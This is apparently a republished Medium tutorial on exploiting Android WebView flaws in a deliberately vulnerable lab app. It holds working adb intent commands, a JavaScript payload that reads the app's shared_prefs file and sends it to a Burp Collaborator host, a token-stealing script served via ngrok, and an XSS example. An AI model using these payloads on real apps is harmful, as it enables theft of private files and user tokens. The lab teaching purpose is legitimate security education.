> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [medium.com](https://medium.com/mobis3c/exploiting-android-webview-vulnerabilities-e2bcff780892)

> The WebView class is an extension of Android's View class that allows you to display web pages as a p......

Exploiting Android WebView Vulnerabilities
==========================================

[![](https://miro.medium.com/fit/c/96/96/1*uTzz4c17GKaaSp47mMSkgw.jpeg)](https://3kal.medium.com/?source=post_page-----e2bcff780892--------------------------------)[Kal](https://3kal.medium.com/?source=post_page-----e2bcff780892--------------------------------)Follow[Apr 4](/mobis3c/exploiting-android-webview-vulnerabilities-e2bcff780892?source=post_page-----e2bcff780892--------------------------------) · 6 min read[](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fe2bcff780892&operation=register&redirect=https%3A%2F%2Fmedium.com%2Fmobis3c%2Fexploiting-android-webview-vulnerabilities-e2bcff780892&source=post_actions_header--------------------------bookmark_preview-----------)

What is WebView?
================

The `WebView` class is an extension of Android's `[View](https://developer.android.com/reference/android/view/View)` class that allows you to display web pages as a part of your activity layout. It does _not_ include any features of a fully developed web browser, such as navigation controls or an address bar. All that `WebView` does, by default, is show a web page.

![](https://miro.medium.com/max/30/1*5SDHi81jlZMlFF9bpraoxA.jpeg?q=20)![](https://miro.medium.com/max/808/1*5SDHi81jlZMlFF9bpraoxA.jpeg)![](https://miro.medium.com/max/1292/1*5SDHi81jlZMlFF9bpraoxA.jpeg)Twitter using webview to load the site.

For testing, we will be using the [vulnerable webview application](https://github.com/t4kemyh4nd/vulnwebview) to learn how to manually exploit the webview’s in android application. Credentials for the login is username:**vuln** and password:**webview (**in case if we need.**)**

![](https://miro.medium.com/max/52/1*cL9RbsDbDGmo3KhUnV4OWg.png?q=20)![](https://miro.medium.com/max/624/1*cL9RbsDbDGmo3KhUnV4OWg.png)![](https://miro.medium.com/max/998/1*cL9RbsDbDGmo3KhUnV4OWg.png)vulnerable WebView app

WebViews are Exported
=====================

Before getting into the vulnerability, we need to make sure that WebViews are part of our target application.

Since WebViews are part of the activities in an application, we need to de-compile an apk to go through AndroidManifest.xml file and the application’s Activities to check for the presence of vulnerable WebView.

Let us first load our application into the [Jadx](/mobis3c/setting-up-an-android-pentesting-environment-29991aa0c3f1#e4f6) de-compiler to analyze the manifest and activities.

![](https://miro.medium.com/max/60/1*vwIi-uNEkMiw8VP_V6URZA.png?q=20)![](https://miro.medium.com/max/329/1*vwIi-uNEkMiw8VP_V6URZA.png)![](https://miro.medium.com/max/526/1*vwIi-uNEkMiw8VP_V6URZA.png)decompiler

Now, we will see which are the components that are **exported.** we can conclude that a component is exported in 2 ways.

*   If component explicitly declares the **“exported=true”** attribute
*   If the component has intent filters & no **“exported=false”** attribute

![](https://miro.medium.com/max/60/1*eQE5lyBsWVyCRy2uIg6AHA.png?q=20)![](https://miro.medium.com/max/875/1*eQE5lyBsWVyCRy2uIg6AHA.png)![](https://miro.medium.com/max/1400/1*eQE5lyBsWVyCRy2uIg6AHA.png)activities exported

some of the components **SupportWebView**, **RegistrationWebView** are explicitly exported and **MainActivity** is exported by mentioning intent filters by which we can confirm that WebViews are being used by the application.

![](https://miro.medium.com/max/60/1*Ph2NV_viLPigf5PYnT-xJw.png?q=20)![](https://miro.medium.com/max/875/1*Ph2NV_viLPigf5PYnT-xJw.png)![](https://miro.medium.com/max/1400/1*Ph2NV_viLPigf5PYnT-xJw.png)confirming with

We can see that the function loadWebView,it is loading the url by getting the string from intent.

![](https://miro.medium.com/max/60/1*OzPyB5u97SYro0NSMeGv9A.png?q=20)![](https://miro.medium.com/max/804/1*OzPyB5u97SYro0NSMeGv9A.png)![](https://miro.medium.com/max/1286/1*OzPyB5u97SYro0NSMeGv9A.png)webview code

So this behavior can be exploited by third party applications by sending an intent to this component with a url string and the target application will accept and execute as this component has been exported. i.e., third party application have access to webview component in target application.

Exploitation
============

We will use ADB to send an intent to the component and this intent will open a malicious webpage provided by the attacker within the context of the application.

```
adb shell am start -n componentname --es string "domain.com"

```

adb shell to start unique shell on a device, am (activity manager) start, -n name of the component, — es extra string followed by the url.

So our adb cmd will look like as follows:

```
adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url "https://3kal.medium.com"

```

![](https://miro.medium.com/max/60/1*o9vgL7pFWEiamsdkm-TvmA.png?q=20)![](https://miro.medium.com/max/875/1*o9vgL7pFWEiamsdkm-TvmA.png)![](https://miro.medium.com/max/1400/1*o9vgL7pFWEiamsdkm-TvmA.png)sending intent to webviews![](https://miro.medium.com/max/28/1*oXuwJE1ama9Bv-zZQMECkQ.png?q=20)![](https://miro.medium.com/max/625/1*oXuwJE1ama9Bv-zZQMECkQ.png)![](https://miro.medium.com/max/1000/1*oXuwJE1ama9Bv-zZQMECkQ.png)webview loaded with attacker url

**NOTE:** The above way works only if the component is directly exported and this doesn’t work for component exported by intent filter.

setAllowUniversalAccessFromFileURLs enabled for WebView
=======================================================

Another setting that the developer can configure is allowing JavaScript running within the context of file scheme URL to access content from any origin including other file scheme URLs.

This setting removes all same origin policy restrictions & allows the webview to make requests to the web from the file which is normally not possible. i.e., Attacker can read local files using java script and send them across the web to a attacker controlled domain.

If the WebView is exported, this behavior can be very dangerous because it can allow the attacker to read arbitrary files which may be private to the application.

![](https://miro.medium.com/max/60/1*A5L7wnzcX8du_hpnBmNvew.png?q=20)![](https://miro.medium.com/max/875/1*A5L7wnzcX8du_hpnBmNvew.png)![](https://miro.medium.com/max/1400/1*A5L7wnzcX8du_hpnBmNvew.png)setAllowUniversalAccessFromFileURLs

Exploitation
============

Now let us see how to exploit this setting which has been used in the above application.

![](https://miro.medium.com/max/60/1*H7gAyIMLSpHdiIN01dN1bA.png?q=20)![](https://miro.medium.com/max/751/1*H7gAyIMLSpHdiIN01dN1bA.png)![](https://miro.medium.com/max/1202/1*H7gAyIMLSpHdiIN01dN1bA.png)setAllowUniversalAccessFromFileURLs

Now, let us create the exploit for the vulnerability in java script as discussed in the vulnerability details.

I have used my burp collaborator link to get the content, you can use whichever is handy for you.

```
<script>
    var url = 'file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml'; //local file
function load(url) {
        var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
            fetch('https://8ktm71h4wjnqo72wgqbzvnr7jypodd.burpcollaborator.net/?exfiltrated=' + btoa(xhr.responseText)); //send b64 encoded file to attacker
            }
        }
xhr.open('GET', url, true);
        xhr.send('');
    }
load(url)
</script>

```

![](https://miro.medium.com/max/60/1*0BzF-GA-dCxlSwWV19qBGg.png?q=20)![](https://miro.medium.com/max/875/1*0BzF-GA-dCxlSwWV19qBGg.png)![](https://miro.medium.com/max/1400/1*0BzF-GA-dCxlSwWV19qBGg.png)Arbitrary file read exploit

Add the above code to **sauafu.html** and move the file to the sdcard using adb.

![](https://miro.medium.com/max/60/1*lLm6-_JqCJvytg6SHdAFaw.png?q=20)![](https://miro.medium.com/max/671/1*lLm6-_JqCJvytg6SHdAFaw.png)![](https://miro.medium.com/max/1074/1*lLm6-_JqCJvytg6SHdAFaw.png)push exploit into device

Exploit loads the content of the local file and returns it to the attacker url.

Now run the intent with exploit file.

```
adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url "file:///sdcard/sauafu.html"

```

![](https://miro.medium.com/max/60/1*S4DzqL83S2Lmrhv-sT3wwA.png?q=20)![](https://miro.medium.com/max/875/1*S4DzqL83S2Lmrhv-sT3wwA.png)![](https://miro.medium.com/max/1400/1*S4DzqL83S2Lmrhv-sT3wwA.png)intent launch![](https://miro.medium.com/max/52/1*_eHbkX_uzZ66mx0pXKzREg.png?q=20)![](https://miro.medium.com/max/629/1*_eHbkX_uzZ66mx0pXKzREg.png)![](https://miro.medium.com/max/1006/1*_eHbkX_uzZ66mx0pXKzREg.png)empty registration page

Now we should have received file contents encoded in base 64 in the burp collaborator or whatever you used.

![](https://miro.medium.com/max/60/1*T8vuPxo7RPClA6J50SSJzA.png?q=20)![](https://miro.medium.com/max/875/1*T8vuPxo7RPClA6J50SSJzA.png)![](https://miro.medium.com/max/1400/1*T8vuPxo7RPClA6J50SSJzA.png)exploit poc

We can see the decoded contents of the file which was received in base 64 encoded on the right window box.

JavaScript Enabled with Interface for WebView
=============================================

Developers can enable java script in the webview by adding this configuration

```
webView.getSettings().setJavaScriptEnabled(true);

```

Adding this configuration creates an interface between the webpage’s java script and the client side java code of the application. i.e., the web page’s java script can access and inject java code into the application.

```
webView.addJavascriptInterface(new WebAppInterface(this), "Android");  

```

if this activity is exported, this can be dangerous and allows an attacker to carry out many attacks including XSS and stealing tokens from the application.

Exploitation
============

For Exploitation of this scenario, we cannot make use of the same web View as above since it doesn’t make use of interface. Hence, we will use some other webView which has used the interface.

![](https://miro.medium.com/max/60/1*F_Zu34Wn0KJ299rfgQ90KA.png?q=20)![](https://miro.medium.com/max/875/1*F_Zu34Wn0KJ299rfgQ90KA.png)![](https://miro.medium.com/max/1400/1*F_Zu34Wn0KJ299rfgQ90KA.png)support webview

we can use support webview as you can see that java script has been enabled along with the use of the interface with the name **Android**.

![](https://miro.medium.com/max/60/1*KSSFFseer-fvHFFxuZ8JJw.png?q=20)![](https://miro.medium.com/max/768/1*KSSFFseer-fvHFFxuZ8JJw.png)![](https://miro.medium.com/max/1228/1*KSSFFseer-fvHFFxuZ8JJw.png)interface declaration

```
<script type="text/javascript">
document.write("token: " + Android.getUserToken());
</script>

```

This script writes the token by generating from the getUserToken() Method from the **Android** object which was the name of the interface.

Host this script from the apache server and connect port 80 to ngrok to get https link (http links cannot be used).

```
sudo service apache2 start
./ngrok http 80
and use https ngrok link
adb shell am start -n com.tmh.vulnwebview/.Supportwebview --es support_url "https://8d95c0fe086f.ngrok.io/token.html"

```

![](https://miro.medium.com/max/60/1*zjVtQsWv_nmuwS0xauCbCw.png?q=20)![](https://miro.medium.com/max/875/1*zjVtQsWv_nmuwS0xauCbCw.png)![](https://miro.medium.com/max/1400/1*zjVtQsWv_nmuwS0xauCbCw.png)intent![](https://miro.medium.com/max/60/1*PuhX4XeOChzEQrmDuGPEwg.png?q=20)![](https://miro.medium.com/max/618/1*PuhX4XeOChzEQrmDuGPEwg.png)![](https://miro.medium.com/max/988/1*PuhX4XeOChzEQrmDuGPEwg.png)token stealing

We can show XSS alert just by replacing the document.write line in the above javascript code with your favorite xss payload.

```
<script type="text/javascript">
alert("kal");
</script>

```

![](https://miro.medium.com/max/48/1*IaFfGb9f9gmzSyr4LEJ47w.png?q=20)![](https://miro.medium.com/max/615/1*IaFfGb9f9gmzSyr4LEJ47w.png)![](https://miro.medium.com/max/984/1*IaFfGb9f9gmzSyr4LEJ47w.png)XSS Alert.

We have covered 4 Vulnerabilities related to WebViews

*   Exported WebView (WebView Hijacking)
*   Universal File access from file is enabled for WebView (File Theft)
*   Use of setJavaScript Enabled(XSS)
*   Javascript Interface (token stealing)

**Note:** Most was taken as is from [Farah Hawa’s Video in youtube](https://www.youtube.com/watch?v=qS5PkC-37io). All credits goes to her, if you like the content then please watch the video and like it.